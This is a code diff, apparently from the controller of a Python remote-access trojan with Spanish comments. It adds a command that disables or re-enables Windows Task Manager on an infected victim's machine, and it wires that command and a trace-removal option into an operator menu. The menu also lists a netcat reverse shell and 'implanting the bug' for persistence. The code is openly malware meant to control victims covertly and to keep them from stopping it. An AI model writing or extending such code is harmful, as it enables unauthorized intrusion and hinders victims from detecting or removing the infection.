@@ -329,6 +329,10 @@ class Control():
 		self.objetivo = servidor.terricolas[client][0]
 		self.hostname = servidor.terricolas[client][2]
 
+		# Variables globales del objeto
+
+		self.taskManagerDisable = False
+
 	# MODULOS EXTRAS
 
 	def run_cmd(self):
@@ -373,6 +377,34 @@ class Control():
 				break
 
 		return
+
+
+	def deshabilitar_TaskManager(self):
+
+		self.servidor.enviar(self.objetivo,"taskManagerDisable")
+		self.servidor.recibir(self.objetivo)
+		time.sleep(0.01)
+
+		if self.taskManagerDisable==False:
+			# Envia a cliente que se deshabilite el Tmgr
+			self.taskManagerDisable=True
+			self.servidor.enviar(self.objetivo,"task_disable")
+			msg = self.servidor.recibir(self.objetivo)
+			print(msg)
+			return
+
+		else:
+			activar = (input(" El administrador de tareas se encuentra deshabilitado. Desea habilitarlo? (s/n): ")).lower()
+			while (activar!="s") and (activar!="n"):
+				print (" Opcion inexistente. Intente nuevamente...")
+				activar = (input(" El administrador de tareas se encuentra deshabilitado. Desea habilitarlo? (s/n): ")).lower()
+
+			if (activar=="s"):
+				self.taskManagerDisable=False
+				self.servidor.enviar(self.objetivo,"task_enable")
+				msg = self.servidor.recibir(self.objetivo)
+				print(msg)
+				return
 
 
 	def netcat(self):
@@ -611,7 +643,8 @@ def manipular(servidor,cliente):
 	"cmd" : ["shell","Ejecutar shell"],
 	"netcat" : ["netcat","Utiliza netcat para obtener un shell inversa"],
 	"persistencia" : ["persistence","Implantar bicho en el cerebro victima"],
-	"autoremover" : ["autoremove","Elimina rastro del bicho en el sisetma infectado"]
+	"autoremover" : ["autoremove","Elimina rastro del bicho en el sisetma infectado"],
+	"taskmgr_disable" : ["taskmgr_disable","Deshabilita el administrador de tareas de Windows"]
 
 	}
 
@@ -662,6 +695,12 @@ def manipular(servidor,cliente):
 
 		elif (victima=="persistencia"):
 			control.persistencia()
+
+		elif (victima=="autoremover"):
+			control.autoremoverse()
+
+		elif (victima=="taskmgr_disable"):
+			control.deshabilitar_TaskManager()
 
 		# MODULOS ARCHIVOS
 
